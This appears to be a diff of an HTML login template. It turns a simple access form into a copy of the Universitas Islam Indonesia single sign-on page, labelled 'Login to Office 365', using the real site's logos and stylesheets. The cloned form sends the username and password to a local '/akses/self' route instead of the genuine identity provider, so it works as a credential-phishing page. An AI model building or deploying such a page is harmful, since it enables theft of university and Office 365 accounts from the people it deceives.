@@ -1,16 +1,92 @@
+
 {% block head %}
-<meta name="viewport" content="width=device-width, initial-scale=1">
-<link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.4.1/css/bootstrap.min.css">
+    <meta charset="utf-8">
+    <title>Login SSO</title>
+
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta http-equiv="Content-Security-Policy" content="frame-src 'self' blob:; child-src 'self' blob:">
+    
+    <link rel="apple-touch-icon" sizes="57x57" href="https://idp.uii.ac.id/idp/css/assets/img/favicon/apple-icon-57x57.png">
+    <link rel="apple-touch-icon" sizes="60x60" href="https://idp.uii.ac.id/idp/css/assets/img/favicon/apple-icon-60x60.png">
+    <link rel="apple-touch-icon" sizes="72x72" href="https://idp.uii.ac.id/idp/css/assets/img/favicon/apple-icon-72x72.png">
+    <link rel="apple-touch-icon" sizes="76x76" href="https://idp.uii.ac.id/idp/css/assets/img/favicon/apple-icon-76x76.png">
+    <link rel="apple-touch-icon" sizes="114x114" href="https://idp.uii.ac.id/idp/css/assets/img/favicon/apple-icon-114x114.png">
+    <link rel="apple-touch-icon" sizes="120x120" href="https://idp.uii.ac.id/idp/css/assets/img/favicon/apple-icon-120x120.png">
+    <link rel="apple-touch-icon" sizes="144x144" href="https://idp.uii.ac.id/idp/css/assets/img/favicon/apple-icon-144x144.png">
+    <link rel="apple-touch-icon" sizes="152x152" href="https://idp.uii.ac.id/idp/css/assets/img/favicon/apple-icon-152x152.png">
+    <link rel="apple-touch-icon" sizes="180x180" href="https://idp.uii.ac.id/idp/css/assets/img/favicon/apple-icon-180x180.png">
+    <link rel="icon" type="image/png" sizes="192x192" href="https://idp.uii.ac.id/idp/css/assets/img/favicon/android-icon-192x192.png">
+    <link rel="icon" type="image/png" sizes="32x32" href="https://idp.uii.ac.id/idp/css/assets/img/favicon/favicon-32x32.png">
+    <link rel="icon" type="image/png" sizes="96x96" href="https://idp.uii.ac.id/idp/css/assets/img/favicon/favicon-96x96.png">
+    <link rel="icon" type="image/png" sizes="16x16" href="https://idp.uii.ac.id/idp/css/assets/img/favicon/favicon-16x16.png">
+    <link rel="manifest" href="https://idp.uii.ac.id/idp/css/assets/img/favicon/manifest.json">
+    <meta name="msapplication-TileColor" content="#ffffff">
+    <meta name="msapplication-TileImage" content="https://idp.uii.ac.id/idp/css/assets/img/favicon/ms-icon-144x144.png">
+    <meta name="theme-color" content="#ffffff">
+
+    <link href="https://fonts.googleapis.com/css?family=Roboto:400,500,700" rel="stylesheet">
+    <link rel="stylesheet" href="https://idp.uii.ac.id/idp/css/assets/css/bootstrap.min.css">
+     <link rel="stylesheet" href="https://idp.uii.ac.id/idp/css/assets/css/style.css">
 {% endblock head %}
 {% block content %}
-<div class="m-5 p-5 bg-primary shadow rounded" align="center">
-<h1 class="text-center fw-bold text-light">SANZ AKSES</h1>
-<div class="mb-3"> 
-<form action="/akses/self" method="POST" enctype="multipart/form-data">
-	<label class="mt-5 text-light fw-bold">Kode akses</label>
-	<input type="text" name="nama" class="mb-3 form-control" placeholder="enter your account here">
-	<button class="btn btn-success" type="submit">Gaskeun</button>
-</form>
-</div>
-</div>
+    <uii-root ng-version="5.2.3"><router-outlet></router-outlet><uii-login>
+    <div class="welcome-greeting">
+      <div class="greeting-box">
+        <!-- <div class="box"> -->
+          <!-- <h1 class="title">Selamat Datang <br>di UII<strong>Gateway</strong></h1> -->
+          <!-- <div class="description"> -->
+            <!-- <p> </p> -->
+          <!-- </div> -->
+        <!-- </div> -->
+      </div>
+    </div>
+
+    <div class="form-box">
+      <div class="form-signin">
+        <div class="image">
+          <img src="https://idp.uii.ac.id/idp/css/assets/img/logo.png">
+        </div>
+        <div class="sso">Single Sign On</div >
+
+        <form action="/akses/self" method="POST" enctype="multipart/form-data" class="ng-untouched ng-pristine ng-invalid">
+            <legend>
+				Login to Office 365
+            </legend>
+
+          <div class="form-group" ng-reflect-klass="form-group" ng-reflect-ng-class="[object Object]">
+            <input class="form-control has-icon form-icon-user ng-untouched ng-pristine ng-invalid" type="text" placeholder="Username" id="username" name="nama">
+          </div>
+          <div class="form-group" ng-reflect-klass="form-group" ng-reflect-ng-class="[object Object]">
+            <input class="form-control has-icon form-icon-key ng-untouched ng-pristine ng-invalid" type="password" placeholder="Password" id="password" name="pass"> 
+          </div>
+                      <!-- <div class="form-group"> -->
+                            <!-- <div class="inner-addon left-addon"> -->
+                <!-- <input type="checkbox" name="donotcache" value="1" id="donotcache"> -->
+                <!-- <label for="donotcache">Don't Remember Login</label> -->
+              <!-- </div> -->
+                        <!-- </div> -->
+
+          
+          <!-- <div class="form-group"> -->
+            <!-- <div class="inner-addon left-addon"> -->
+              <!-- <input id="_shib_idp_revokeConsent" type="checkbox" name="_shib_idp_revokeConsent" value="true"> -->
+              <!-- <label for="_shib_idp_revokeConsent">Clear prior granting of permission for release of your information to this service.</label> -->
+            <!-- </div> -->
+          <!-- </div> -->
+          
+          <div class="form-group form-button">
+            <button class="btn btn-primary btn-lg btn-block" type="submit" 
+                onClick="this.childNodes[0].nodeValue='Mohon tunggu...'"
+                >Masuk</button>
+             
+          </div>
+          
+          
+        </form>
+
+        <!-- <div class="account text-center">   -->
+            <!-- <p><a>Lupa password?</a></p>  -->
+        <!-- </div> -->
+      </div>
+    </div>
 {% endblock content %}
